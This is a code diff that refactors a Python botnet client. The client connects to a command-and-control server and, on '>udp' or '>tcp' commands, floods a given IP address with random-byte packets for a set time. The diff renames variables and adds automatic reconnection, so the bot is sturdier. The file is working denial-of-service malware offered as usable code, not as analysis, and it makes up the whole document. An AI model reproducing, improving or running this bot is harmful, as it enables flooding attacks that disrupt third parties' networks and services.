@@ -3,85 +3,97 @@ import time
 import socket
 import random
 
-socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-host = "127.0.0.1" # IP for bot to connect to.
-port = 8000 # The infected connection port
+host = "localhost" # IP for the bot to connect to
+port = 8888 # Port for the bot to connect to
 
 connected = False
 
 def system():
-	global socket
+	global sock
+	global connected
 
-	while connected is False:
+	while not connected:
 		try:
-			global connected
-			socket.connect((host, port))
+			sock.connect((host, port))
 			connected = True
 		except:
 			pass
 
 	print("Connected")
 
-	while True:
-		msg = socket.recv(1024)
+	while connected is True:
+		try:
+			msg = sock.recv(1024)
+			if ">killbots" in msg.lower():
+				sys.exit()
 
-		if ">killbots" in msg.lower():
-			sys.exit()
+			if ">udp" in msg.lower():
+				def udpflood():
+					import socket
+					try:
+						ip = msg.split(" ")[1]
+						psize = int(msg.split(" ")[2])
+						timer = int(float(msg.split(" ")[3]))
 
-		if ">udp" in msg.lower():
-			def udpflood():
-				import socket
+						timeout = time.time() + 1 * timer
+
+						package = random._urandom(psize)
+
+						udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
+
+						print("Command Accepted!")
+						print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
+
+						while True:
+							port = random.randint(1, 65535)
+							udpflood.sendto(package, (ip, port))
+							udpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
+							if time.time() > timeout:
+								return
+					except:
+						pass
+				udpflood()
+
+			if ">tcp" in msg.lower():
+				def tcpflood():
+					import socket
+					try:
+						ip = msg.split(" ")[1]
+						psize = int(msg.split(" ")[2])
+						timer = int(float(msg.split(" ")[3]))
+
+						timeout = time.time() + 1 * timer
+
+						package = random._urandom(psize)
+
+						tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+						tcpflood.connect((ip, 80))
+
+						print("Command Accepted!")
+						print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
+
+						while True:
+							port = random.randint(1, 65535)
+							tcpflood.sendto(package, (ip, port))
+							tcpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
+							if time.time() > timeout:
+								return
+					except:
+						pass
+				tcpflood()
+		except socket.error:
+			connected = False
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			print("Disconnected")
+			while not connected:
 				try:
-					ip = msg.split(" ")[1]
-					psize = int(msg.split(" ")[2])
-					timer = int(float(msg.split(" ")[3]))
-
-					timeout = time.time() + 1 * timer
-
-					package = random._urandom(psize)
-
-					udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
-
-					print("Command Accepted!")
-					print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
-
-					while True:
-						port = random.randint(1, 65535)
-						udpflood.sendto(package, (ip, port))
-						udpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
-						if time.time() > timeout:
-							return
-				except:
+					sock.connect((host, port))
+					connected = True
+					print("Reconnected")
+				except socket.error:
 					pass
-			udpflood()
-
-		if ">tcp" in msg.lower():
-			def tcpflood():
-				import socket
-				try:
-					ip = msg.split(" ")[1]
-					psize = int(msg.split(" ")[2])
-					timer = int(float(msg.split(" ")[3]))
-
-					timeout = time.time() + 1 * timer
-
-					package = random._urandom(psize)
-
-					tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-					tcpflood.connect((ip, 80))
-
-					print("Command Accepted!")
-					print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
-
-					while True:
-						port = random.randint(1, 65535)
-						tcpflood.sendto(package, (ip, port))
-						tcpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
-						if time.time() > timeout:
-							return
-				except:
-					pass
-			tcpflood()
+	sock.close()
 system()
